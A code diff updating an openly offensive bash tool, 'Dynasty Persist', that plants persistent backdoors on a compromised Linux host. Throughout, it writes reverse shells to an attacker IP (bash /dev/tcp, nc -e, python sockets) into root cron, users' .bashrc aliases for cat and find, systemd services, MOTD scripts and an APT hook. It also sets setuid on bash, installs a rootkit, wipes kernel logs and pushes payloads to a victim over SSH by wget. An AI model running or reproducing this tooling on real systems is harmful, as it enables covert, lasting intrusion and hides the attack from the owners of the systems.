@@ -6,9 +6,11 @@
 #        Title: Dynasty Persist                #  
 #        Author: Trevohack                     # 
 #        Date: 1.14.2024                       #  
-#        Version: 1.4                          # 
+#        Version: 1.4.2                        # 
 #                                              # 
 ################################################ 
+
+echo "$ip"
 
 helpmenu() {
     echo -e "\e[1m
@@ -65,9 +67,6 @@ helpmenu() {
 
 }
 
-ip="$1"
-port="$2"
-mode="$3" 
 
 RED='\033[0;31m'
 GREEN='\033[0;32m'
@@ -78,6 +77,9 @@ CYAN='\033[0;36m'
 WHITE='\033[0;37m'
 RESET='\033[0m'
 
+ip="$1"
+port="$2"
+mode="$3"
 
 newUser() {
     echo -e "\033[0;32m[+] - New User Config " && echo -e "\n"
@@ -86,6 +88,7 @@ newUser() {
     adduser $Newuser 
     usermod -aG sudo $Newuser 
     chmod u+s /bin/bash
+    echo -e "${RESET}"
 }
 
 
@@ -102,6 +105,7 @@ sshConfig() {
         fi
     done 
     echo -e "\033[0;32m[+] - SSH key generation complete."
+    echo -e "${RESET}"
 
 }
 
@@ -135,49 +139,53 @@ WantedBy=default.target"
     systemctl start rshell.service 
 
     echo -e "\033[0;32m[+] - Systemd Root Level Service successfully configued!"
+    echo -e "${RESET}"
 }
 
 ModServiceOnSystemd() {
     echo -e "\033[0;32m[+] - Modify Systemd Service for Persistence"
     read -p "Enter the location of the service: " loca
-    sed -i "/^ExecStart=/c\ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$1/$2 0>&1'" "$loca"
+    sed -i "/^ExecStart=/c\ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'" "$loca"
     if grep -q "ExecStartPre" "$service_file"; then
-        sed -i "s/^ExecStartPre=.*/ExecStartPre=/bin/bash -c 'bash -i >& /dev/tcp/$1/$2 0>&1'" "$loca"
+        sed -i "s/^ExecStartPre=.*/ExecStartPre=/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'" "$loca"
         echo "ExecStartPre present! ExecStartPre was modified!\n\n"
     else
         echo "No ExecStartPre present! ExecStart was modified!\n\n"
     fi
     echo -e "\033[0;32m[+] - Modified Root level setup successfully!"
+    echo -e "${RESET}"
 }
 
 cronJobs() {
     echo -e "\033[0;32m[+] - Setting up cronjobs for persistence ... " && echo -e "\n"
-    comandx="/bin/bash -c 'bash -i >& /dev/tcp/$1/$2 0>&1'"
-    command2="/usr/bin/python -c \"import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$1\\\",$2));subprocess.call(['/bin/sh','-i'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\""
-    command3="/usr/bin/python3 -c \"import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$1\\\",$2));subprocess.call(['/bin/sh','-i'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\""    echo "* * * * * root $comandx" | sudo tee -a /etc/crontab 
+    comandx="/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
+    command2="/usr/bin/python -c \"import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$ip', $port));subprocess.call(['/bin/sh','-i'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\""
+    command3="/usr/bin/python3 -c \"import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$ip', $port));subprocess.call(['/bin/sh','-i'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\""
     echo "* * * * * root $comandx" | sudo tee -a /etc/crontab 
     echo "* * * * * root $command2" | sudo tee -a /etc/crontab 
     echo "* * * * * root $command3" | sudo tee -a /etc/crontab 
     echo -e "\033[0;32m[+] - Cronjobs successfully started."
+    echo -e "${RESET}"
 }
 
 bashrc() {
     echo -e "\033[0;32m[+] - Configuring ~/.bashrc for persistence ... " && echo -e "\n"
-    command0="/bin/bash -c 'bash -i >& /dev/tcp/$1/$2 0>&1'"
-    command="nc -e /bin/sh $1 $2"
+    command0="/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
+    command="nc -e /bin/sh $ip $port"
     for user in /home/*; do
         if [ -d "$user" ]; then
           echo "$command" >> "$user/.bashrc"
           echo "$command0" >> "$user/.bashrc"
-          echo 'alias cat=/bin/bash -c 'bash -i >& /dev/tcp/$1/$2 0>&1'' >> "$user/.bashrc" 
-          echo 'alias find=/bin/bash -c 'bash -i >& /dev/tcp/$1/$2 0>&1'' >> "$user/.bashrc"
+          echo 'alias cat=/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'' >> "$user/.bashrc" 
+          echo 'alias find=/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'' >> "$user/.bashrc"
         fi
+    done 
     echo "$command0" >> "/root/.bashrc"
     echo "$command" >> "/root/.bashrc"
-    echo 'alias cat=/bin/bash -c 'bash -i >& /dev/tcp/$1/$2 0>&1'' >> "/root/.bashrc" 
-    echo 'alias find=/bin/bash -c 'bash -i >& /dev/tcp/$1/$2 0>&1'' >> "/root/.bashrc" 
-    done
+    echo 'alias cat=/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'' >> "/root/.bashrc" 
+    echo 'alias find=/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'' >> "/root/.bashrc" 
     echo -e "\033[0;32m[+] - Bashrc persistence added!"
+    echo -e "${RESET}"
 }
 
 configDiamorphine() {
@@ -198,7 +206,7 @@ configDiamorphine() {
     rm -rf /var/tmp/.memory
     dmesg -C 
     echo "Nothing to see here ... " > /var/log/kern.log
-    echo -e "\033[0;32m[+] - Rootkit configured successfully"
+    echo -e "\033[0;32m[+] - Rootkit configured successfully ${RESET}"
 }
 
 LDPreloadPrivesc() {
@@ -206,6 +214,7 @@ LDPreloadPrivesc() {
     chmod +x preload.sh
     ./preload.sh
     echo -e "\033[0;32m[+] - Configured!\n"
+    echo -e "${RESET}"
 }
 
 rcePersistence() {
@@ -214,32 +223,26 @@ rcePersistence() {
     mkdir /var/www/html/dynasty_rce 
     cp rce.php /var/www/dynasty_rce/rce.php 
     cd /var/www/html/dynasty_rce 
-    nohup php -S 0.0.0.0:$2 > /dev/null 2>&1 & 
-    echo -e "\033[0;32m[+] - RCE on $2\n" 
+    nohup php -S 0.0.0.0:$PORT > /dev/null 2>&1 & 
+    echo -e "\033[0;32m[+] - RCE on $PORT\n" 
+    echo -e "${RESET}"
 }
 
 MessageOfTheDay() {
     echo -e "\033[0;32m[+] - Linux header / Message Of The Day Persistence\n"
-    echo "bash -c 'bash -i >& /dev/tcp/$1/$2 0>&1'" >> /etc/update-motd.d/00-header 
-    echo "nc -e /bin/sh $1 $2" >> /etc/update-motd.d/00-header 
-    echo "$python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$1",$2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'' >> /etc/update-motd.d/00-header"
+    echo "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'" >> /etc/update-motd.d/00-header 
+    echo "nc -e /bin/sh $ip $port" >> /etc/update-motd.d/00-header 
+    echo "$python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'' >> /etc/update-motd.d/00-header"
     echo -e "\033[0;32m[+] - Success!"
+    echo -e "${RESET}"
 }
 
 backdoorApt() {
     echo -e "\033[0;32m[+] - Backdoor APT\n"
-    revshell="sh -i >& /dev/tcp/$1/$2 0>&1"
-    echo "APT::Update::Pre-Invoke {"nohup sh -i >& /dev/tcp/$1/$2 0>&1 2> /dev/null &"};" > /etc/apt/apt.conf.d/42backdoor 
+    revshell="sh -i >& /dev/tcp/$ip/$port 0>&1"
+    echo "APT::Update::Pre-Invoke {"nohup sh -i >& /dev/tcp/$ip/$port 0>&1 2> /dev/null &"};" > /etc/apt/apt.conf.d/42backdoor 
     echo -e "\033[0;32m[+] - APT is now spooky!\n"
-}
-
-ctfModeConfig() {
-    # Make sure to host the dynsaty persist directory in a web server on port 80 
-    mkdir /boot/grub/.grub 
-    cd /boot/grub/.grub 
-    wget $1:80/rce.php 
-    wget $1:80/exec.sh
-    wget $1:80/preload.sh
+    echo -e "${RESET}"
 }
 
 ctf_Mode() {
@@ -252,78 +255,140 @@ ctf_Mode() {
     read -p "Enter VICTIM PWD: " victim_pwd 
     read -p "Enter VICTIM SSH PORT: " victim_port
     
-    local script_content=$(typeset -f ctfModeConfig sshConfig cronJobs bashrc backdoorApt MessageOfTheDay rcePersistence LDPreloadPrivesc)
 
-    sshpass -p "$victim_pwd" ssh -o StrictHostKeyChecking=no -p "$victim_port" root@"$victim_ip" "bash -s" <<EOF
-        _victim_ip="$victim_ip"
-        _attacker_port="$attacker_port"
-        $script_content
-        ctfModeConfig "\$_victim_ip" 
+    sshpass -p "$victim_pwd" ssh -o StrictHostKeyChecking=no -p "$victim_port" root@"$victim_ip" "bash -s" <<EOF 
+        mkdir /boot/grub/.grub 
         cd /boot/grub/.grub 
-        sshConfig 
-        cronJobs "\$_victim_ip" "\$_attacker_port"
-        bashrc "\$_victim_ip" "\$_attacker_port"
-        backdoorApt "\$_victim_ip" "\$_attacker_port"
-        MessageOfTheDay "\$_victim_ip" "\$_attacker_port"
-        rcePersistence "\$_victim_ip" "\$_attacker_port"
-        LDPreloadPrivesc 
+        wget $attacker_ip:80/rce.php 
+        wget $attacker_ip:80/exec.sh
+        wget $attacker_ip:80/preload.sh
+        echo -e "\n"
+
+        echo -e "\033[0;32m[+] - Setting up cronjobs for persistence ... " && echo -e "\n"
+        comandx="/bin/bash -c 'bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1'"
+        command2="/usr/bin/python -c \"import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$attacker_ip', $attacker_port));subprocess.call(['/bin/sh','-i'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\""
+        command3="/usr/bin/python3 -c \"import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$attacker_ip', $attacker_port));subprocess.call(['/bin/sh','-i'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\""
+        echo "* * * * * root $comandx" | sudo tee -a /etc/crontab 
+        echo "* * * * * root $command2" | sudo tee -a /etc/crontab 
+        echo "* * * * * root $command3" | sudo tee -a /etc/crontab 
+        echo -e "\033[0;32m[+] - Cronjobs successfully started.\n"
+
+        echo -e "\033[0;32m[+] - RCE Persistence\n"
+        PORT=9056 
+        mkdir /var/www/html/dynasty_rce 
+        # cp /boot/grub/.grub/rce.php /var/www/dynasty_rce/rce.php 
+        cd /var/www/html/dynasty_rce 
+        nohup php -S 0.0.0.0:$PORT > /dev/null 2>&1 & 
+        echo -e "\033[0;32m[+] - RCE on $PORT\n" 
+
+        echo -e "\033[0;32m[+] - Configuring ~/.bashrc for persistence ... " && echo -e "\n"
+        command0="/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
+        command="nc -e /bin/sh $ip $port"
+        for user in /home/*; do
+            if [ -d "$user" ]; then
+                echo "$command" >> "$user/.bashrc"
+                echo "$command0" >> "$user/.bashrc"
+                echo 'alias cat=/bin/bash -c 'bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1'' >> "$user/.bashrc" 
+                echo 'alias find=/bin/bash -c 'bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1'' >> "$user/.bashrc"
+            fi
+        done
+            echo "$command0" >> "/root/.bashrc"
+            echo "$command" >> "/root/.bashrc"
+            echo 'alias cat=/bin/bash -c 'bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1'' >> "/root/.bashrc" 
+            echo 'alias find=/bin/bash -c 'bash -i >& /dev/tcp/$attacker_ip/$port 0>&1'' >> "/root/.bashrc" 
+            echo -e "\033[0;32m[+] - Bashrc persistence added!\n"
+
+        echo -e "\033[0;32m[+] - Linux header / Message Of The Day Persistence\n"
+        echo "bash -c 'bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1'" >> /etc/update-motd.d/00-header 
+        echo "nc -e /bin/sh $attacker_ip $attacker_port" >> /etc/update-motd.d/00-header 
+        echo "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$attacker_ip",$attacker_port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'' >> /etc/update-motd.d/00-header"
+        echo -e "\033[0;32m[+] - Success!"
         exit
 EOF
 }
 
+payloads() {
+    echo -e """              
+    [${RED}1${RESET}] SSH Key Generation                        
+    [${RED}2${RESET}] Cronjob Persistence                      
+    [${RED}3${RESET}] Custom User with Root
+    [${RED}4${RESET}] RCE Persistence 
+    [${RED}5${RESET}] LKM/Rootkit
+    [${RED}6${RESET}] Bashrc Persistence 
+    [${RED}7${RESET}] Systemd Service for Root
+    [${RED}8${RESET}] LD_PRELOAD Privilege Escalaion Config                 
+    [${RED}9${RESET}] Backdooring Message of the Day / Header 
+    [${RED}10${RESET}] Modify An Existing Systemd Service 
+    [${RED}11${RESET}] Backdoor APT 
+    ${RESET}
+    """ 
+}
 
 main() {
+    
+    if [[ $(id -u) -ne "0" ]]; then
+        echo "[RED] This script should run as root!" >&2 
+        exit 1
+    fi
 
-        cat bin/banner.txt
-        echo -e """ 
+    echo -e """ 
 
-       [${RED}1${RESET}] SSH Key Generation                       [${RED}4${RESET}] RCE Persistence 
-       [${RED}2${RESET}] Cronjob Persistence                      [${RED}5${RESET}] LKM/Rootkit
-       [${RED}3${RESET}] Custom User with Root                    [${RED}6${RESET}] Bashrc Persistence 
-       [${RED}7${RESET}] Systemd Service for Root                 [${RED}8${RESET}] LD_PRELOAD Privilege Escalaion Config
-       [${RED}9${RESET}] Backdooring Message of the Day / Header 
-       [${RED}10${RESET}] Modify An Existing Systemd Service 
-       [${RED}11${RESET}] Backdoor APT
-       
-       help for more information! 
-       ${RESET}
-       """ 
+    ${RED}
+               /\                                                 /?
+     _         )( ______________________   ______________________ )(         _   
+    (_)///////(**)______________________> <______________________(**)///////(_)
+               )(                                                 )(
+               \/                                                 \? 
 
-       read -p "[-{DYNASTY-P3R1ST}-] " input
-       if [ "$input" == "1" ]; then
-           sshConfig
-       elif [ "$input" == "2" ]; then
-           cronJobs
-       elif [ "$input" == "3" ]; then
-           newUser
-       elif [ "$input" == "4" ]; then
+
+                                ${YELLOW} ~ DynastyPersist ~
+                                   [ By: Trevohack ] ${RESET}        
+""" 
+    while true; do
+        read -p "Dynasty > " input
+        payload=$(echo "$input" | grep -oP '^use\s+\K\d+')
+
+        if [ "$input" == "exit" ]; then
+            echo -e "${GREEN}[SUCCESS] Exiting the Dynasty${RESET}"
+            break
+        elif [ "$input" == "show payloads" ]; then
+            payloads
+        elif [ "$payload" == "1" ]; then
+            sshConfig
+        elif [ "$payload" == "2" ]; then
+            cronJobs
+        elif [ "$payload" == "3" ]; then
+            newUser
+        elif [ "$payload" == "4" ]; then
             rcePersistence
-       elif [ "$input" == "5" ]; then
-           configDiamorphine
-       elif [ "$input" == "6" ]; then
-           bashrc 
-       elif [ "$input" == "7" ]; then
-           ServiceOnSystemd 
-       elif [ "$input" == "8" ]; then
-           LDPreloadPrivesc 
-       elif [ "$input" == "9" ]; then
-           MessageOfTheDay
-       elif  [ "$input" == "10" ]; then
-           ModServiceOnSystemd 
-        elif  [ "$input" == "11" ]; then
-           backdoorApt
-       elif [ "$input" == "help" ] || [ input == "h" ]; then
-           helpmenu 
-       else 
-           echo -e "${RED}[ERROR] Invalid command"
-        fi 
+        elif [ "$payload" == "5" ]; then
+            configDiamorphine
+        elif [ "$payload" == "6" ]; then
+            bashrc 
+        elif [ "$payload" == "7" ]; then
+            ServiceOnSystemd 
+        elif [ "$payload" == "8" ]; then
+            LDPreloadPrivesc 
+        elif [ "$payload" == "9" ]; then
+            MessageOfTheDay
+        elif  [ "$payload" == "10" ]; then
+            ModServiceOnSystemd 
+        elif  [ "$payload" == "11" ]; then
+            backdoorApt
+        elif [ "$payload" == "options" ] || [ payload == "help" ] || [ payload == "h" ] || [ payload == "show options" ]; then
+            helpmenu 
+        else 
+            echo -e "${RED}[ERROR] Invalid command!"
+            echo -e "${RESET}"
+        fi
+   done 
 } 
 
 if [ $# -eq 1 ] && [ "$1" == "ctf" ]; then
     clear
     ctf_Mode
-elif [ $# -eq 3 ] && [ "$3" == "normal" ]; then
-    clear
+elif [ $# -eq 3 ] && [ "$3" == "console" ]; then
+    clear 
     main
 else
     helpmenu 
